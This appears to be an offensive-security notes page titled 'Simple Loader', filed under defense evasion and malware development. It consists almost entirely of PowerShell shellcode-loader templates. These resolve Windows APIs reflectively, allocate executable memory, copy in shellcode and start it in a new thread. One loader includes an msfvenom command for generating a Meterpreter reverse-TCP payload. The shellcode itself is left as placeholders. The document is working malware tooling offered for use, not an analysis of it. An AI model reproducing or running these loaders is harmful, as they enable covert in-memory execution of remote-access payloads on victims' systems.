# Simple Loader

## VirtualAlloc

```powershell
$Win32Functions = New-Object System.Object

$VirtualAllocAddress = Get-ProcAddress kernel32.dll VirtualAlloc
$VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddress, $VirtualAllocDelegate)
$Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc
```

### VirtualFree

Releases, decommits, or releases and decommits a region of memory within the virtual address space of the calling process.

```powershell
$Win32Functions = New-Object System.Object

$VirtualFreeAddress = Get-ProcAddress kernel32.dll VirtualFree
$VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
$VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddress, $VirtualFreeDelegate)
$Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree
```

### VirtualFreeEx

```powershell
$Win32Functions = New-Object System.Object

$VirtualFreeExAddress = Get-ProcAddress kernel32.dll VirtualFreeEx
$VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
$VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddress, $VirtualFreeExDelegate)
$Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx
```

### VirtualProtect

Changes the protection on a region of committed pages in the virtual address space of the calling process.

```powershell
$Win32Functions = New-Object System.Object

$VirtualProtectAddress = Get-ProcAddress kernel32.dll VirtualProtect
$VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddress, $VirtualProtectDelegate)
$Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect
```

### VirtualProtectEx

```

```

### Copy Memory

#### C Runtime

```powershell
$Win32Functions = New-Object System.Object

$memcpyAddress = Get-ProcAddress msvcrt.dll memcpy
$memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
$memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddress, $memcpyDelegate)
$Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy
```

### Move Memory

```c
RtlMoveMemory(&destMemAddr, &source, length);
MoveMemory(&destMemAddr, &source, length);
FillMemory(&destMemAddr, 1, ByteByteOfShellcode);
```

#### C Runtime

```powershell
$Win32Functions = New-Object System.Object

$memsetAddress = Get-ProcAddress msvcrt.dll memset
$memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
$memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddress, $memsetDelegate)
$Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset
```

### Reflective

```powershell
function LookupFunc {
    Param ($moduleName, $functionName)

	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll')}).GetType('Microsoft.Win32.UnsafeNativeMethods')

    $tmp = @()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}

    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        [Parameter(Position = 1)] [Type] $delType = [Void]
    )

    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])

    $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')

    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')

    return $type.CreateType()
}

$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

# $ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f ps1

[Byte[]] $buf = 0x00

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)

[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
```

## .NET

### C Runtime

```powershell
$API = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$WindowsFunction = Add-Type -memberDefinition $API -Name "Win32" -Namespace Win32Functions -PassThru

[Byte[]];
[Byte[]]$buffer = <shellcode>

$size = 0x1000

if ($buffer.Length -gt 0x1000) {
	$size = $buffer.Length
}

$memory_allocation = $WindowsFunction::VirtualAlloc(0, $size, 0x3000, 0x40)

for ($i = 0; $i -le ($buffer.Length - 1); $i++) {
	$WindowsFunction::memset([IntPtr]($memory_allocation.ToInt32() + $i), $buffer[$i], 1)
}

$WindowsFunction::CreateThread(0, 0, $memory_allocation, 0, 0, 0)

for (;;) {
	Start-Sleep 60
}
```

### WinAPI

```powershell
ï»¿$API = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
}
"@

Add-Type $API

[Byte[]] $buf = <shellcode>
$size = $buf.Length
[IntPtr]$addr = [Kernel32]::VirtualAlloc(0, $size, 0x3000, 0x40);
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)
$thandle = [Kernel32]::CreateThread(0, 0, $addr, 0, 0, 0);
```

```powershell
$API = @"
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
"@

$WinAPI = Add-Type -memberDefinition $API -Name "Win32" -namespace Win32Functions -passthru

[Byte[]] $buf = <shellcode>

$addr = $WinAPI::VirtualAlloc(0, [Math]::Max($buf.Length, 0x1000), 0x3000, 0x40)

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $buf.Length)

$WinAPI::CreateThread(0, 0, $addr, 0, 0, 0)
```

---
## References

### Backlinks

- [[06 - Tactics & Techniques & Procedures Phases/F - Post Exploitation/0x01 - Defense Evasion/08 - Obfuscate Artifacts/Obfuscation/Malware Development/Payload Templates/Programming Languages/PowerShell/Payloads|Global Helpers: PowerShell Payload]]

- [[06 - Tactics & Techniques & Procedures Phases/F - Post Exploitation/0x01 - Defense Evasion/08 - Obfuscate Artifacts/Obfuscation/Malware Development/Functions/Windows/Import Address Table/PowerShell|Obfuscation: IAT Obfuscation]]

### Bordergate

- [Bordergate: Offensive PowerShell](https://www.bordergate.co.uk/offensive-powershell/)

### Mosse Cyber Security Institute

- [Mosse Cyber Security Institute: Powershell Shellcoding: Part 1](https://library.mosse-institute.com/articles/2022/10/powershell-shellcode-part-1.html)